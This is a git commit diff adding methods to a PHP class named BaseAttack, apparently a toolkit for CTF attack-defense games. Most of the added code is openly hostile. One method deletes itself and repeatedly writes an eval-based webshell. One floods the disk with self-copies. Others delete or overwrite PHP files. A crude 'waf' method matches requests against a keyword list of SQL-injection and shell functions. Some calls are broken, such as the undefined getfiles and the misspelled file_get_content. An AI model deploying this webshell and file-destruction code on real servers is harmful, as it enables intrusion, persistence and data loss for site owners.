5c8d3da84aed064b181e48c48859b67c297f285d
zx648383079 <648383079@qq.com>
2016-11-01 09:40:30 +0800

    修改

--- Domain/Attack/BaseAttack.php
+++ Domain/Attack/BaseAttack.php
@@ -18,4 +18,99 @@ class BaseAttack {
 	 *       然后就可以下载config.txt查看内容了！
 	 *       可以试试更变态的命令，不要干坏事哦！
 	 *******************************************************/
+
+    /**
+     * DELETE SELF AND ADD SHELL
+     */
+	public static function addShell() {
+        set_time_limit(0);
+
+        ignore_user_abort(1);
+
+        unlink(__FILE__);
+        while(1){
+            file_put_contents('path/webshell.php','<?php @eval($_POST["password"]);?>');
+        }
+    }
+
+    /**
+     *
+     */
+    public static function addBomb() {
+        set_time_limit(0);
+        ignore_user_abort(true);
+        while(1){
+            file_put_contents(randstr().'.php',file_get_content(__FILE__));
+            file_get_contents("http://127.0.0.1/");
+        }
+    }
+
+    public static function deleteAllFile() {
+        set_time_limit(0);
+        ignore_user_abort(1);
+        array_map('unlink', glob("some/dir/*.php"));
+    }
+
+    public static function deleteAll() {
+        set_time_limit(0);
+        ignore_user_abort(1);
+        unlink(__FILE__);
+        while(1){
+            getfiles(__DIR__);
+            sleep(10);
+        }
+    }
+
+    protected static function deleteFile() {
+        foreach (glob($path) as $afile) {
+            if (is_dir($afile)) {
+                getfiles($afile.'/*.php');
+            } else {
+                @file_put_contents($afile,"#Anything#");
+                //unlink($afile);
+            }
+        }
+    }
+
+    protected static function logging($var){
+        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);
+        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
+    }
+    public static function waf() {
+        $get = $_GET;
+        $post = $_POST;
+        $cookie = $_COOKIE;
+        $header = getallheaders();
+        $files = $_FILES;
+        $ip = $_SERVER["REMOTE_ADDR"];
+        $method = $_SERVER['REQUEST_METHOD'];
+        $filepath = $_SERVER["SCRIPT_NAME"];
+        //rewirte shell which uploaded by others, you can do more
+        foreach ($_FILES as $key => $value) {
+            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
+            file_put_contents($_FILES[$key]['tmp_name'], "virink");
+        }
+        unset($header['Accept']);//fix a bug
+        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);
+        //deal with
+        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
+        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
+        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
+        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
+        $vpattern = explode("|",$pattern);
+        $bool = false;
+        foreach ($input as $k => $v) {
+            foreach($vpattern as $value){
+                foreach ($v as $kk => $vv) {
+                    if (preg_match( "/$value/i", $vv )){
+                        $bool = true;
+                        logging($input);
+                        break;
+                    }
+                }
+                if($bool) break;
+            }
+            if($bool) break;
+        }
+    }
 }
